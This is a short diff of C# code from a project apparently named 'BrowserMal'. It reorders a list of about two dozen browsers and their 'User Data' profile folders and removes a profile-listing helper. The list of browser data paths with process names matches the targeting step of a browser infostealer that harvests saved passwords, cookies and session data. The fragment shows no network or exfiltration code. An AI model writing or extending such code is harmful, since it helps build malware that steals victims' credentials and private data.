@@ -15,9 +15,9 @@ namespace BrowserMal.Browser
 
         public void Init()
         {
+			_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
 			_browserModelsList.Add(new BrowserModel("Comodo Dragon", Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data"), "dragon"));
 			_browserModelsList.Add(new BrowserModel("Opera", Path.Combine(ApplicationData, @"Opera Software\Opera Stable"), "opera"));
-			_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
 			_browserModelsList.Add(new BrowserModel("Yandex", Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("360 Browser", Path.Combine(LocalApplicationData + @"\360Chrome\Chrome\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("CoolNovo", Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data"), ""));
@@ -43,11 +43,6 @@ namespace BrowserMal.Browser
 			_browserModelsList.Add(new BrowserModel("Liebao Browser", Path.Combine(LocalApplicationData, @"liebao\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("QIP Surf", Path.Combine(LocalApplicationData, @"QIP Surf\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("Edge Chromium", Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data"), "msedge"));
-        }
-
-		public List<string> GetProfiles(string path)
-        {
-			return Util.GetAllProfiles(path);
         }
 
 		public List<BrowserModel> GetBrowsers() => _browserModelsList;
